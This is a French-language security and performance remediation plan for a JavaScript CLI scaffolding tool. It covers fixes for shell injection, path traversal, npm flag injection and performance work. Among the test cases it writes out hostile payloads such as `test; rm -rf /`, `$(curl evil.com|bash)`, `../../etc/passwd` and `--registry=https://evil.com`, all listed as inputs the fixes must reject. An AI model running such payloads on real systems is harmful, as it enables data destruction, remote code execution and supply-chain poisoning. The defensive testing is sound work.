# Todo List - Sécurité & Optimisations ConfigJS

**Date de création**: 20 janvier 2026  
**Référence audit**: `AUDIT_SECURITE_PERFORMANCE.md`  
**Durée estimée totale**: ~88 heures  
**Priorité globale**: 🔴 HAUTE (production-blocking)

---

## 📋 Légende

- 🔴 **CRITIQUE** - Doit être corrigé avant production
- ⚠️ **MAJEUR** - À traiter rapidement
- 🟡 **IMPORTANT** - À inclure dans prochaine release
- 🟢 **OPTIONNEL** - Améliorations long-terme

**État des tâches**:
- ⬜ `[ ]` - À faire
- 🔄 `[~]` - En cours
- ✅ `[x]` - Complété
- ⏸️ `[!]` - Bloqué / En attente

---

## PHASE 0: SETUP & PRÉPARATION (4 heures)

### 0.1 Audit initial & documentation 🔴
- [x] Analyse complète codebase
- [x] Génération rapport AUDIT_SECURITE_PERFORMANCE.md
- [x] Identification 7 vulnérabilités + 12 problèmes majeurs
- [x] Validation CVSS scores
- **Responsable**: @audit-team
- **État**: ✅ COMPLÉTÉ (20 janvier 2026)
- **Durée**: 12h

### 0.2 Setup infrastructure de test 🔴
- [x] Créer branche `security/main` dans Git
- [x] Setup CI/CD pour tests de sécurité
  - [x] npm audit integration
  - [x] SAST (Static Analysis Security Testing)
  - [x] Dependency checking (Snyk)
- [x] Configurer pre-commit hooks
  - [x] Vérifier pas de credentials
  - [x] ESLint security rules
  - [x] Zod schema validation
- [x] Créer fixtures d'exploitation
  - [x] Shell injection payloads
  - [x] Path traversal attempts
  - [x] Package poisoning tests
- **Responsable**: DevOps/Lead Dev
- **Durée estimée**: 4h
- **Prérequis**: Aucun
- **État**: ✅ COMPLÉTÉ (20 janvier 2026)
- **Critères d'acceptation**:
  - [x] CI/CD exécute audit npm à chaque commit
  - [x] Tests de sécurité passent avant merge
  - [x] Documentation du setup complète

### 0.3 Créer test suites pour exploits 🔴
- [ ] Suite tests shell injection (15+ cas)
  - [ ] Command separator: `;`, `&&`, `||`, `|`
  - [ ] Substitution: `$(...)`, `` `...` ``
  - [ ] Variables: `$VAR`, `${VAR}`
  - [ ] Wildcards: `*`, `?`, `[...]`
- [ ] Suite tests path traversal (20+ cas)
  - [ ] POSIX: `../`, `../../`, etc.
  - [ ] Windows: `..\`, `..\\`, UNC paths
  - [ ] Normalized: `%2e%2e/`, URL encoding
  - [ ] Edge cases: `symlinks`, `hard links`
- [ ] Suite tests package injection (10+ cas)
  - [ ] npm flags: `--registry`, `--save`, etc.
  - [ ] Scope packages: `@scope/pkg`
  - [ ] Git URLs: `git+https://...`
- **Responsable**: QA/Security
- **Durée estimée**: 3h
- **Bloqué par**: 0.2
- **Critères d'acceptation**:
  - Tous les exploits peuvent être reproduits
  - Tests documenter le comportement attendu
  - Base de comparaison avant/après fixes

---

## PHASE 1: CORRECTIONS CRITIQUES (18 heures)

### 1.1 Corriger Shell Injection - Svelte 🔴
- [ ] Analyser `src/cli/utils/svelte-installer.ts`
  - [ ] Identifier tous les `execSync()` avec shell=true
  - [ ] Documenter inputs utilisateur injectés
  - [ ] Tracer flux données: prompt → command
- [ ] Refactoriser vers `spawn()`
  - [ ] Remplacer `execSync()` par Promise-based spawn
  - [ ] Utiliser `shell: false` partout
  - [ ] Passer arguments comme array (pas de template string)
- [ ] Implémenter error handling
  - [ ] Capturer exit code
  - [ ] Gérer SIGTERM/SIGKILL
  - [ ] Timeout après 5min
- [ ] Tester avec payloads malveillants
  - [ ] `test; rm -rf /` → Doit échouer
  - [ ] `$(curl evil.com|bash)` → Doit échouer
  - [ ] Names normaux → Doivent fonctionner
- **Responsable**: Lead Dev / Security
- **Durée estimée**: 2h
- **Fichiers affectés**:
  - `src/cli/utils/svelte-installer.ts` (line 50)
- **Tests requis**:
  - `tests/security/shell-injection.test.ts` (10+ cas)
- **Critères d'acceptation**:
  - Tous les tests shell injection PASS
  - npm run build réussit
  - npm run test:security passe

### 1.2 Corriger Shell Injection - Angular 🔴
- [ ] Analyser `src/cli/utils/angular-installer.ts`
  - [ ] Identifier pattern similaire à Svelte
  - [ ] Refactoriser avec même approche spawn()
  - [ ] Copier error handling de 1.1
- [ ] Tester avec payloads malveillants
- **Responsable**: Lead Dev / Security
- **Durée estimée**: 1.5h
- **Bloqué par**: 1.1 (copier pattern)
- **Critères d'acceptation**:
  - Tous tests shell injection pour Angular PASS
  - Cohérence avec Svelte implementation

### 1.3 Corriger Shell Injection - Autres frameworks 🔴
- [ ] Audit tous les fichiers `src/cli/utils/*-installer.ts`
  - [ ] Next.js, React, Vue, Vite
  - [ ] Documenter tous les `execSync()` usages
- [ ] Refactoriser de façon systématique
  - [ ] Réutiliser helpers de 1.1
  - [ ] Créer `executeCommand()` helper centralisé
- [ ] Tester couverture complète
- **Responsable**: Lead Dev
- **Durée estimée**: 1.5h
- **Bloqué par**: 1.1 (pattern établi)
- **Critères d'acceptation**:
  - Zéro `execSync()` avec `shell: true`
  - Zéro template strings dans commands

### 1.4 Implémenter validation inputs utilisateur 🔴
- [ ] Créer schemas Zod pour tous les prompts
  - [ ] `projectName`: `/^[a-zA-Z0-9._-]+$/`, min 1, max 100
  - [ ] `packageManager`: enum de managers valides
  - [ ] `language`: enum de langages supportés
  - [ ] `port`: integer 1-65535
  - [ ] Tous les inputs: trimmer, rejeter `../` et `..\\`
- [ ] Appliquer validation dans tous les prompts
  - [ ] `src/cli/prompts/vite-setup.ts`
  - [ ] `src/cli/prompts/svelte-setup.ts`
  - [ ] `src/cli/prompts/react-setup.ts`
  - [ ] `src/cli/prompts/nextjs-setup.ts`
  - [ ] Etc. (tous les fichiers dans `src/cli/prompts/`)
- [ ] Ajouter validation double côté serveur
  - [ ] Après réception prompt → valider encore
  - [ ] Fail-safe (mieux valider deux fois)
- [ ] Documenter patterns de validation
  - [ ] Créer `src/core/input-validator.ts` centralisé
  - [ ] Exporter helpers réutilisables
- [ ] Tester tous les vecteurs d'injection
  - [ ] Path traversal: `../../etc/passwd`
  - [ ] Shell commands: `; rm -rf /`
  - [ ] Unicode tricks: `\x2e\x2e/`
- **Responsable**: Lead Dev
- **Durée estimée**: 6h
- **Fichiers affectés**:
  - `src/cli/prompts/*` (5-10 fichiers)
  - `src/core/input-validator.ts` (NEW)
- **Tests requis**:
  - `tests/security/input-validation.test.ts` (30+ cas)
- **Critères d'acceptation**:
  - Tous les inputs validés avant utilisation
  - Tests de fuzz passing
  - Documentation complète

### 1.5 Implémenter Path Traversal Protection 🔴
- [ ] Analyser `src/utils/fs-helpers.ts`
  - [ ] Identifier toutes opérations filesystem
  - [ ] Tracer où `projectRoot` est défini
  - [ ] Documenter assumptions de sécurité
- [ ] Créer `validatePathInProject()` helper
  - [ ] Accepter `userPath` et `projectRoot`
  - [ ] Normaliser chemins
  - [ ] Vérifier que resolved ⊂ projectRoot
  - [ ] Rejeter `../`, `..\\`, symlinks traversals
  - [ ] Retourner chemin absolut validé
- [ ] Appliquer validation partout
  - [ ] `readFileContent()` - valider path
  - [ ] `writeFileContent()` - valider path
  - [ ] `checkPathExists()` - valider path
  - [ ] Tous les appels `resolve()`/`join()`
- [ ] Traiter cas edge cases
  - [ ] Symlinks (option: follow ou reject)
  - [ ] Permissions (vérifier readable/writable)
  - [ ] Fichiers système (`.git`, `node_modules`)
- [ ] Tester avec payloads traversal
  - [ ] `../../../../etc/passwd`
  - [ ] `..%2f..%2fetc%2fpasswd`
  - [ ] Symlinks pointant dehors
- **Responsable**: Lead Dev / Security
- **Durée estimée**: 5h
- **Fichiers affectés**:
  - `src/utils/fs-helpers.ts`
  - `src/utils/fs-adapter.ts` (potentiellement)
  - `src/core/input-validator.ts` (réutiliser)
- **Tests requis**:
  - `tests/security/path-traversal.test.ts` (25+ cas)
- **Critères d'acceptation**:
  - Tous les tests path traversal PASS
  - Aucun accès en dehors projectRoot
  - Performance < 1ms par validation

### 1.6 Implémenter validation Package Names 🔴
- [ ] Ajouter dépendance `validate-npm-package-name`
  - [ ] `npm install validate-npm-package-name`
  - [ ] `npm install --save-dev @types/validate-npm-package-name`
- [ ] Créer `validatePackageNames()` helper
  - [ ] Rejeter strings commençant par `--`
  - [ ] Rejeter formats invalides npm
  - [ ] Support scoped packages `@scope/pkg`
  - [ ] Whitelist de caractères autorisés
- [ ] Intégrer dans tous les install flows
  - [ ] `src/utils/package-manager.ts` - `getInstallCommand()`
  - [ ] Tous les plugins - avant `installPackages()`
  - [ ] Post-download verification
- [ ] Tester injection npm flags
  - [ ] `--registry=https://evil.com`
  - [ ] `--proxy=https://evil.com`
  - [ ] `--save`, `--no-save` (doivent être rejetés)
  - [ ] Noms valides normaux (doivent passer)
- **Responsable**: Lead Dev
- **Durée estimée**: 3h
- **Fichiers affectés**:
  - `src/utils/package-manager.ts`
  - `src/core/package-validator.ts` (NEW)
  - `package.json` (ajouter dépendance)
- **Tests requis**:
  - `tests/security/package-injection.test.ts` (15+ cas)
- **Critères d'acceptation**:
  - Tous les injections npm flags rejetées
  - Packages valides installés correctement
  - Aucune regression dans install flow

### 1.7 Ajouter Timeouts & Resource Limits 🔴
- [ ] Analyser `src/utils/package-manager.ts`
  - [ ] Identifier tous les `execa()` sans timeout
  - [ ] Identifier tous les `execSync()` sans timeout
  - [ ] Documenter durations attendues
- [ ] Implémenter timeouts
  - [ ] Package install: **5 minutes** max
  - [ ] Détection contexte: **30 secondes** max
  - [ ] Plugin configuration: **1 minute** max
  - [ ] Validation: **30 secondes** max
- [ ] Implémenter resource limits
  - [ ] `maxBuffer`: 10MB (stdout/stderr)
  - [ ] Rejeter si > 10MB reçu
- [ ] Implémenter AbortSignal
  - [ ] Cancellable par user (Ctrl+C)
  - [ ] Cleanup resources après timeout
  - [ ] Rollback en cas de timeout
- [ ] Ajouter user feedback
  - [ ] Progress bar de timeout
  - [ ] Messages informatifs
  - [ ] Suggestions de fix (network issues, etc.)
- [ ] Tester timeouts
  - [ ] Forcer timeout via mock
  - [ ] Vérifier cleanup
  - [ ] Vérifier rollback
- **Responsable**: Lead Dev
- **Durée estimée**: 3h
- **Fichiers affectés**:
  - `src/utils/package-manager.ts`
  - `src/cli/utils/*-installer.ts`
  - `src/core/installer.ts`
- **Tests requis**:
  - `tests/security/timeout.test.ts` (10+ cas)
- **Critères d'acceptation**:
  - Aucun timeout > limites définies
  - Cleanup complet après timeout
  - User messages clairs

---

## PHASE 2: CORRECTIONS MAJEURES (30 heures)

### 2.1 Refactor `process.chdir()` - Utiliser chemins absolus 🔴
- [ ] Analyser `src/cli/commands/react-command.ts` (et autres commands)
  - [ ] Identifier tous les `process.chdir()`
  - [ ] Tracer implications sur rollback
  - [ ] Documenter chemins relatifs qui en dépendent
- [ ] Refactoriser Architecture
  - [ ] Bannir `process.chdir()` complètement
  - [ ] Utiliser chemins absolus partout
  - [ ] Passer `projectRoot` comme context à chaque fonction
  - [ ] Mettre à jour contexte: `this.ctx.projectRoot`
- [ ] Mettre à jour toutes les opérations filesystem
  - [ ] Toujours utiliser `path.resolve(projectRoot, relativePath)`
  - [ ] Auditer 50+ appels filesystem
  - [ ] Valider que chemins sont absolus
- [ ] Implémenter rollback safety
  - [ ] Créer snapshot projectRoot avant modifs
  - [ ] Capability de restoration complète
  - [ ] Tests garantissant consistency
- [ ] Refactoriser tests
  - [ ] Mettre à jour tests pour chemins absolus
  - [ ] Tester rollback scenarios
- **Responsable**: Lead Dev
- **Durée estimée**: 4h
- **Fichiers affectés**:
  - `src/cli/commands/*.ts` (6-8 fichiers)
  - `src/core/installer.ts`
  - `src/core/detector.ts`
- **Tests requis**:
  - `tests/unit/absolute-paths.test.ts`
  - `tests/integration/rollback-safety.test.ts`
- **Critères d'acceptation**:
  - Zéro `process.chdir()` dans codebase
  - Tous les chemins absolus
  - Rollback restore original dir

### 2.2 Implémenter Atomic Installation & Snapshot System 🔴
- [ ] Analyser `src/core/installer.ts`
  - [ ] Identifier phases installation
  - [ ] Points d'échec possible
  - [ ] Dépendances entre phases
- [ ] Créer Snapshot Manager
  - [ ] `createSnapshot()` - sauvegarde état complet
    - [ ] package.json + package-lock.json
    - [ ] Tous les fichiers modifiés
    - [ ] npm cache (optionnel)
  - [ ] `restoreSnapshot()` - restore état complet
  - [ ] `releaseSnapshot()` - nettoyer snapshots
  - [ ] Cleanup après 24h
- [ ] Implémenter Transaction Log
  - [ ] Logger chaque action (ACID-like)
  - [ ] Timestamps précis
  - [ ] Erreurs avec stack traces
  - [ ] Permettre replay/debug
- [ ] Restructurer install flow
  - [ ] Phase 1: Validation
    - [ ] Vérifier tous les checks
    - [ ] NO modifications
  - [ ] Phase 2: Backup
    - [ ] Créer snapshot AVANT tout
    - [ ] Backup fichiers concernés
  - [ ] Phase 3: Installation
    - [ ] npm install (atomic)
    - [ ] Chaque plugin config avec error handling
    - [ ] Rollback per-plugin si erreur
  - [ ] Phase 4: Cleanup
    - [ ] Cleanup snapshots si success
    - [ ] Garder snapshots si erreur (for debug)
- [ ] Tester rollback scenarios
  - [ ] Success case: snapshot deleted
  - [ ] Failure during install: restore from snapshot
  - [ ] Failure during config: partial rollback + snapshot available
  - [ ] Timeout: cleanup + restore
- **Responsable**: Lead Dev / Architecture
- **Durée estimée**: 8h
- **Fichiers affectés**:
  - `src/core/installer.ts` (refactor major)
  - `src/core/snapshot-manager.ts` (NEW)
  - `src/core/transaction-log.ts` (NEW)
  - `src/core/backup-manager.ts` (enhance)
- **Tests requis**:
  - `tests/unit/snapshot-manager.test.ts`
  - `tests/integration/atomic-install.test.ts` (15+ scenarios)
- **Critères d'acceptation**:
  - Zéro états inconsistent après erreur
  - Rollback complète garantie
  - All error scenarios tested
  - Performance overhead < 5%

### 2.3 Optimiser Complexité Algorithmique O(n²) → O(n) 🔴
- [ ] Analyser `src/core/validator.ts`
  - [ ] Identifier nested loops
  - [ ] Mesurer impact pour 50, 100, 200 plugins
  - [ ] Benchmark current état
- [ ] Créer Index Structures
  - [ ] `ConflictChecker` avec categoryIndex: Map<string, Set<Plugin>>
  - [ ] `DependencyIndex` avec depsIndex: Map<string, Plugin[]>
  - [ ] `VersionResolver` avec versions cache
- [ ] Refactoriser Validator
  - [ ] Remplacer nested loops par index lookups
  - [ ] Change `O(n²)` → `O(n)` complexity
  - [ ] Optimiser validation rules
  - [ ] Cache results de compatibility checks
- [ ] Analyser `src/core/installer.ts`
  - [ ] Identifier autres sources O(n²)
  - [ ] Appliquer mêmes techniques d'indexing
- [ ] Benchmark improvements
  - [ ] 10 plugins: mesurer impact
  - [ ] 50 plugins: target < 25ms
  - [ ] 100 plugins: target < 50ms
  - [ ] 200 plugins: target < 100ms
- [ ] Profiler avec DevTools
  - [ ] Vérifier pas de regressions
  - [ ] Memory usage
  - [ ] CPU utilization
- **Responsable**: Lead Dev / Performance
- **Durée estimée**: 4h
- **Fichiers affectés**:
  - `src/core/validator.ts` (refactor)
  - `src/core/installer.ts` (refactor)
  - `src/core/indexing.ts` (NEW)
- **Tests requis**:
  - `tests/performance/validator-performance.test.ts`
  - `tests/performance/installer-performance.test.ts`
- **Critères d'acceptation**:
  - O(n) complexity (proof in code)
  - 100 plugins validated < 50ms
  - Pas de memory leaks
  - All existing tests still pass

### 2.4 Corriger Template Injection dans Configs 🔴
- [ ] Analyser tous les plugins de génération config
  - [ ] `src/plugins/nextjs/image-optimization.ts`
  - [ ] `src/plugins/*/config-*.ts`
  - [ ] Identifier injection points
- [ ] Implémenter Safe Config Generation
  - [ ] Parser config files (JSON, JS, YAML, TOML)
  - [ ] Validate structure avant injection
  - [ ] Utiliser AST manipulation pour safety
  - [ ] Preserve original formatting si possible
- [ ] Créer Config Sanitizer
  - [ ] Valider JSON/JS/YAML/TOML schema
  - [ ] Reject malformed configs
  - [ ] Merge strategies sûres
  - [ ] Rollback si corruption détectée
- [ ] Tester injection attempts
  - [ ] Malformed JSON → reject
  - [ ] Invalid JS syntax → reject
  - [ ] Env variable leaks → prevent
  - [ ] Valid configs → accept
- **Responsable**: Lead Dev
- **Durée estimée**: 3h
- **Fichiers affectés**:
  - `src/plugins/*/config-*.ts` (multiple files)
  - `src/core/config-sanitizer.ts` (NEW)
- **Tests requis**:
  - `tests/security/config-injection.test.ts`
- **Critères d'acceptation**:
  - Tous les injections rejetées
  - Configs valides toujours acceptées

### 2.5 Implémenter npm Package Integrity Checking 🔴
- [ ] Analyser package-lock.json handling
  - [ ] Vérifier integrity checksums
  - [ ] Valider avant installation
  - [ ] Post-install verification
- [ ] Implémenter Verification
  - [ ] Avant install: vérifier lock file integrity
  - [ ] Après install: vérifier packages intégrité
  - [ ] Comparer checksums
  - [ ] Reject si mismatch
- [ ] Ajouter Security Options
  - [ ] `--prefer-offline` si disponible
  - [ ] `--no-save` pour installs non-modifs
  - [ ] `--save-exact` pour versions précises
  - [ ] `--audit` après installation
- [ ] Tester verification
  - [ ] Corrupted lock file → reject
  - [ ] Modified package → detect
  - [ ] Valid packages → accept
- **Responsable**: Lead Dev
- **Durée estimée**: 3h
- **Fichiers affectés**:
  - `src/utils/package-manager.ts`
  - `src/core/integrity-checker.ts` (NEW)
- **Tests requis**:
  - `tests/security/package-integrity.test.ts`
- **Critères d'acceptation**:
  - Tous les packages vérifiés
  - Corrupted packages détectés
  - Aucun false positives

### 2.6 Mettre à jour dépendances tierces 🔴
- [ ] Audit initial
  - [ ] `npm audit` - documenter toutes vulnérabilités
  - [ ] `npm outdated` - documenter versions outdated
  - [ ] Vérifier compatibilité Node 20+
- [ ] Mettre à jour Zod
  - [ ] `npm update zod@^5.0.0`
  - [ ] Vérifier migration breaking changes
  - [ ] Mettre à jour type hints si nécessaire
  - [ ] Tests pour validation logic
- [ ] Mettre à jour autres dépendances critiques
  - [ ] `@types/node` → latest
  - [ ] `typescript` → latest compatible
  - [ ] `inquirer` → check compatibility
  - [ ] Autres avec vulnerabilités connues
- [ ] Tester compatibility
  - [ ] `npm test` - tous les tests pass
  - [ ] `npm run build` - build successful
  - [ ] `npm run lint` - linting pass
- [ ] Documentation des breaking changes
  - [ ] Changelog update
  - [ ] Migration guide si nécessaire
- **Responsable**: DevOps / Lead Dev
- **Durée estimée**: 2h
- **Fichiers affectés**:
  - `package.json`
  - `package-lock.json`
  - `CHANGELOG.md`
- **Tests requis**:
  - Full test suite
  - Compatibility tests
- **Critères d'acceptation**:
  - `npm audit` - 0 vulnerabilities
  - All tests passing
  - Build successful

### 2.7 Implémenter Rate Limiting & DoS Protection 🟡
- [ ] Analyser CLI invocation patterns
  - [ ] Identifier exploitation scenarios
  - [ ] Mesurer normal usage patterns
- [ ] Implémenter Rate Limiter
  - [ ] Per-user rate limit (1 call/second)
  - [ ] Global rate limit (10 calls/second)
  - [ ] Sliding window ou token bucket
- [ ] Ajouter User Feedback
  - [ ] Messages informatifs
  - [ ] Cooldown timers
  - [ ] Alternative suggestions
- [ ] Tester DoS protection
  - [ ] Rapid-fire calls → throttled
  - [ ] Normal usage → unaffected
- **Responsable**: Lead Dev
- **Durée estimée**: 2h
- **Fichiers affectés**:
  - `src/core/rate-limiter.ts` (NEW)
  - `src/cli.ts` (integrate)
- **Tests requis**:
  - `tests/unit/rate-limiter.test.ts`
- **Critères d'acceptation**:
  - DoS attempts throttled
  - Normal usage unaffected

### 2.8 Créer Comprehensive Test Suite pour Security 🔴
- [ ] Tests Shell Injection (15+ cases)
  - [ ] Command separators
  - [ ] Variable substitution
  - [ ] Command substitution
  - [ ] Glob patterns
- [ ] Tests Path Traversal (25+ cases)
  - [ ] POSIX traversal
  - [ ] Windows traversal
  - [ ] Encoded traversal
  - [ ] Symlink traversal
  - [ ] Edge cases
- [ ] Tests Input Validation (30+ cases)
  - [ ] Invalid characters
  - [ ] Length limits
  - [ ] Reserved names
  - [ ] Special characters
- [ ] Tests Package Injection (15+ cases)
  - [ ] npm flags
  - [ ] Invalid package names
  - [ ] Registry poisoning attempts
  - [ ] Scope packages
- [ ] Tests Rollback (20+ cases)
  - [ ] Success rollback
  - [ ] Error rollback
  - [ ] Partial failures
  - [ ] Timeout rollback
- [ ] Integration Tests (15+ scenarios)
  - [ ] Full install flows
  - [ ] Error recovery
  - [ ] Multiple plugins
- **Responsable**: QA / Security
- **Durée estimée**: 6h
- **Fichiers créés**:
  - `tests/security/shell-injection.test.ts`
  - `tests/security/path-traversal.test.ts`
  - `tests/security/input-validation.test.ts`
  - `tests/security/package-injection.test.ts`
  - `tests/integration/rollback.test.ts`
  - `tests/integration/full-flow.test.ts`
- **Tests requis**: 120+ total test cases
- **Critères d'acceptation**:
  - 100% test pass rate
  - Coverage > 85% security code
  - All exploits caught

---

## PHASE 3: OPTIMISATIONS PERFORMANCE (40 heures)

### 3.1 Paralléliser Installation & Configuration 🟡
- [ ] Analyser current sequential flow
  - [ ] Identifier bottlenecks
  - [ ] Mesurer temps chaque phase
  - [ ] Profiler avec DevTools
- [ ] Refactoriser Package Installation
  - [ ] Group packages par package manager
  - [ ] Install all in single command
  - [ ] Parallel runs si multiple managers
  - [ ] Reduce npm calls de 20+ → 1-2
- [ ] Refactoriser Plugin Configuration
  - [ ] Identify independent plugins
  - [ ] Parallel configuration possible
  - [ ] Safe ordering pour dépendances
  - [ ] Promise.all() usage pattern
- [ ] Implémenter Concurrency Controller
  - [ ] Limit parallel tasks (max 4 workers)
  - [ ] Queue management
  - [ ] Error isolation (1 failure != tous fail)
- [ ] Tester performance
  - [ ] 50 plugins: target 30-35s (vs 50s)
  - [ ] 100 plugins: target 60s (vs 100+s)
  - [ ] Mesurer memory overhead
- **Responsable**: Lead Dev / Performance
- **Durée estimée**: 8h
- **Fichiers affectés**:
  - `src/core/installer.ts` (refactor)
  - `src/core/concurrency-controller.ts` (NEW)
- **Tests requis**:
  - `tests/performance/parallel-install.test.ts`
  - Benchmark suite
- **Critères d'acceptation**:
  - 40-50% reduction en temps installation
  - No race conditions
  - Error isolation working
  - Memory overhead < 10%

### 3.2 Implémenter Batch I/O Operations 🟡
- [ ] Analyser filesystem I/O patterns
  - [ ] Count readFile calls
  - [ ] Count writeFile calls
  - [ ] Group par operation type
- [ ] Créer Batch Filesystem Adapter
  - [ ] Queue operations
  - [ ] Batch by type (reads, writes)
  - [ ] Execute in parallel
  - [ ] Return batched results
- [ ] Intégrer dans config generation
  - [ ] Queue writes au lieu d'écrire immédiatement
  - [ ] Flush at strategic points
  - [ ] Maintain consistency
- [ ] Tester batching
  - [ ] Same results as sequential
  - [ ] Performance improvement measurable
  - [ ] No file corruption
- **Responsable**: Lead Dev
- **Durée estimée**: 4h
- **Fichiers affectés**:
  - `src/utils/fs-adapter.ts` (enhance)
  - `src/core/batch-filesystem.ts` (NEW)
- **Tests requis**:
  - `tests/performance/batch-io.test.ts`
- **Critères d'acceptation**:
  - I/O operations reduced 40-50%
  - Performance improvement 5-10%
  - No data loss or corruption

### 3.3 Implémenter In-Memory Caching 🟡
- [ ] Analyser repeated operations
  - [ ] Config file reads
  - [ ] Plugin metadata
  - [ ] Compatibility checks
  - [ ] File existence checks
- [ ] Implémenter Cache Layers
  - [ ] L1: In-process memory (LRU)
  - [ ] L2: Filesystem cache (24h TTL)
  - [ ] Invalidation strategies
- [ ] Créer Cache Manager
  - [ ] `get()`, `set()`, `invalidate()`
  - [ ] TTL support
  - [ ] Size limits
  - [ ] Memory pressure handling
- [ ] Tester caching
  - [ ] Multiple runs: faster
  - [ ] After modification: stale invalidated
  - [ ] Memory bounded
- **Responsable**: Lead Dev
- **Durée estimée**: 4h
- **Fichiers affectés**:
  - `src/core/cache-manager.ts` (NEW)
  - `src/core/detector.ts` (integrate)
  - `src/utils/fs-helpers.ts` (integrate)
- **Tests requis**:
  - `tests/performance/caching.test.ts`
- **Critères d'acceptation**:
  - Second run 70% faster
  - Cache invalidation accurate
  - Memory overhead bounded

### 3.4 Optimiser Zod Validation Performance 🟡
- [ ] Benchmark current Zod 4.x performance
  - [ ] Profile validation time
  - [ ] Identify hot paths
- [ ] Upgrade vers Zod 5.x (fait en 2.6)
  - [ ] 30% performance improvement
  - [ ] Measure post-upgrade
- [ ] Implémenter Lazy Validation
  - [ ] Parse sans validation d'abord
  - [ ] Validate on-demand
  - [ ] Cache validation results
- [ ] Réduire validation surface
  - [ ] Valider inputs seulement (pas internals)
  - [ ] Coarse-grained validation
  - [ ] Skip redundant checks
- **Responsable**: Lead Dev
- **Durée estimée**: 2h
- **Fichiers affectés**:
  - `src/core/input-validator.ts`
  - Validator usage throughout
- **Tests requis**:
  - Validation tests
  - Performance benchmarks
- **Critères d'acceptation**:
  - Validation time < 10ms per input
  - 30% improvement from Zod upgrade

### 3.5 Implémenter Streaming pour Large Projects 🟡
- [ ] Analyser memory usage patterns
  - [ ] Peak memory identification
  - [ ] Large project scenarios
  - [ ] Identify arrays accumulating data
- [ ] Implémenter Generators/Streams
  - [ ] Replace arrays with iterators
  - [ ] Lazy evaluation
  - [ ] Memory pressure relief
- [ ] Refactoriser hot paths
  - [ ] Plugin iteration
  - [ ] Config application
  - [ ] File writing
- [ ] Tester memory reduction
  - [ ] 50 plugins: memory reduction 20%
  - [ ] 100 plugins: memory reduction 30%
  - [ ] GC pressure reduced
- **Responsable**: Lead Dev
- **Durée estimée**: 5h
- **Fichiers affectés**:
  - `src/core/installer.ts`
  - `src/core/config-writer.ts`
- **Tests requis**:
  - Memory profiling tests
  - Correctness verification
- **Critères d'acceptation**:
  - Peak memory 20-30% reduction
  - No correctness regression

### 3.6 Implémenter Framework Detection Caching 🟡
- [ ] Analyser detection logic
  - [ ] `src/core/detector.ts`
  - [ ] Filesystem scans
  - [ ] Package.json parsing
  - [ ] Time measurements
- [ ] Créer Detector Cache
  - [ ] Cache results 24h
  - [ ] Invalidate on file change
  - [ ] Manual refresh option
- [ ] Implémenter Smart Invalidation
  - [ ] FSEvents ou file watching
  - [ ] Detect package.json changes
  - [ ] Detect important file changes
- [ ] Tester second run performance
  - [ ] First run: X seconds
  - [ ] Second run (cached): <100ms
  - [ ] Correctness maintained
- **Responsable**: Lead Dev
- **Durée estimée**: 3h
- **Fichiers affectés**:
  - `src/core/detector.ts` (enhance)
  - `src/core/cache-manager.ts` (integrate)
- **Tests requis**:
  - `tests/performance/detector-cache.test.ts`
- **Critères d'acceptation**:
  - Cached detection < 100ms
  - No stale data issues

### 3.7 Implémenter Progressive Installation UI 🟡
- [ ] Analyser current UI
  - [ ] Spinner usage
  - [ ] User feedback timing
  - [ ] Information density
- [ ] Créer Progress System
  - [ ] Detailed progress indication
  - [ ] Estimated time remaining
  - [ ] Current task display
  - [ ] Cancellation option
- [ ] Implémenter Task Tracking
  - [ ] Break down installation steps
  - [ ] Track % completion per step
  - [ ] Update UI in real-time
- [ ] Ajouter Logging
  - [ ] Verbose mode
  - [ ] Log file generation
  - [ ] Debug information
- **Responsable**: Lead Dev / UX
- **Durée estimée**: 3h
- **Fichiers affectés**:
  - `src/cli/ui/` (enhance)
  - `src/core/installer.ts` (emit events)
- **Critères d'acceptation**:
  - User knows what's happening
  - ETA reasonable accuracy
  - Cancellation working

### 3.8 Code Splitting & Lazy Loading 🟡
- [ ] Analyser bundle structure
  - [ ] `npm run build` - analyze output
  - [ ] Identify large modules
  - [ ] Plugin loading patterns
- [ ] Implémenter Lazy Plugin Loading
  - [ ] Load plugins on-demand
  - [ ] Only required plugins loaded
  - [ ] Reduce initial startup time
- [ ] Optimiser Bundle Size
  - [ ] Tree-shaking verification
  - [ ] Dead code elimination
  - [ ] Target < 15MB bundled
- [ ] Tester startup time
  - [ ] CLI launch time
  - [ ] First command execution
  - [ ] Memory on startup
- **Responsable**: Lead Dev / Performance
- **Durée estimée**: 4h
- **Fichiers affectés**:
  - `src/core/plugin-loader.ts` (NEW)
  - Build configuration
- **Tests requis**:
  - Startup time benchmarks
  - Bundle analysis
- **Critères d'acceptation**:
  - Startup < 500ms
  - Bundle < 15MB
  - First command < 2s

### 3.9 Profiling & Benchmarking Suite 🟡
- [ ] Créer Performance Test Framework
  - [ ] Baseline measurements
  - [ ] Regression detection
  - [ ] Comparative analysis
- [ ] Implémenter Key Metrics
  - [ ] Install time (varies by plugins)
  - [ ] Memory usage (peak)
  - [ ] CPU utilization
  - [ ] I/O operation count
- [ ] Setup Continuous Monitoring
  - [ ] CI/CD performance tests
  - [ ] Regression alerts
  - [ ] Performance reports
- [ ] Benchmark Tools
  - [ ] hyperfine (CLI comparisons)
  - [ ] node --inspect (profiling)
  - [ ] clinic.js (diagnostics)
- **Responsable**: DevOps / Performance
- **Durée estimée**: 4h
- **Fichiers affectés**:
  - `tests/performance/*` (suite)
  - CI/CD configuration
- **Critères d'acceptation**:
  - Automated performance tests
  - Regression detection active
  - Benchmarks documented

---

## PHASE 4: LONG-TERME & ENHANCEMENTS (Optionnel - 20 heures)

### 4.1 Remplacer `inquirer` par CLI plus léger 🟢
- [ ] Évaluer alternatives
  - [ ] `prompts` - 0.5MB vs 5MB
  - [ ] `enquirer` - lean alternative
  - [ ] `pastel` - React-based
- [ ] Prototyper migration
  - [ ] Create branch `refactor/cli-prompts`
  - [ ] Migrate 1 prompt type
  - [ ] Test compatibility
- [ ] Migrer tous les prompts
  - [ ] `src/cli/prompts/*` → new library
  - [ ] Maintain feature parity
  - [ ] Improve UX si possible
- [ ] Tester compatibility
  - [ ] All platforms (Windows, Mac, Linux)
  - [ ] Interactive input
  - [ ] Accessibility
- **Durée estimée**: 6h
- **Bundle size reduction**: 90% (5MB → 0.5MB)
- **Impact**: Startup time -2-3s

### 4.2 Plugin Sandboxing 🟢
- [ ] Évaluer sandbox solutions
  - [ ] Worker threads
  - [ ] V8 snapshots
  - [ ] VM2 library
- [ ] Implémenter Plugin Isolation
  - [ ] Run plugins in sandbox
  - [ ] Limit filesystem access
  - [ ] Control process spawning
  - [ ] Monitor resource usage
- [ ] API Safe pour plugins
  - [ ] Whitelisted filesystem operations
  - [ ] Restricted command execution
